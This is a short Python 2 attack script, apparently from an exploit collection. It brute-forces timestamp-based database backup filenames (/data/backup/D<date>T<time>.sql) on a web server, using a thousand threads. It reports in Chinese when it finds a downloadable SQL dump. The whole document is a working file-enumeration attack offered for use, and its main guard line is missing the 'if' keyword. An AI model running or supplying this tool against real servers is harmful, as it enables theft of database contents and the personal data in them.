#! /usr/bin/env python  
# _*_  coding:utf-8 _*_  
import time  
import requests  
import threadpool  
  
date= "2018-01-18 10:00:00"  
datelist=[]  
  
def gettime():  
     timeArray = time.strptime(date,"%Y-%m-%d %H:%M:%S")  
     time1= int(time.mktime(timeArray))  
     time2=int(time.time())  
     for i in range(time1,time2):  
         time3= time.strftime('%Y%m%d %H%M%S', time.localtime(i))  
         datelist.append(time3)  
     return datelist  
def req(str):             
     try:  
         str1,str2=str.split()  
         date1="D"+str1+"T"+str2  
         url="http://127.0.0.1/data/backup/"+date1+".sql"  
         s=requests.get(url,timeout=5)  
         if  s.status_code==200:  
             print u"数据库备份文件爆破成功："  
             print url  
   
     except:  
         pass  
   
__name__ == '__main__':  
     list=gettime()  
     pool = threadpool.ThreadPool(1000)   
     requ = threadpool.makeRequests(req,list)   
     [pool.putRequest(req) for req in requ]   
     pool.wait()  
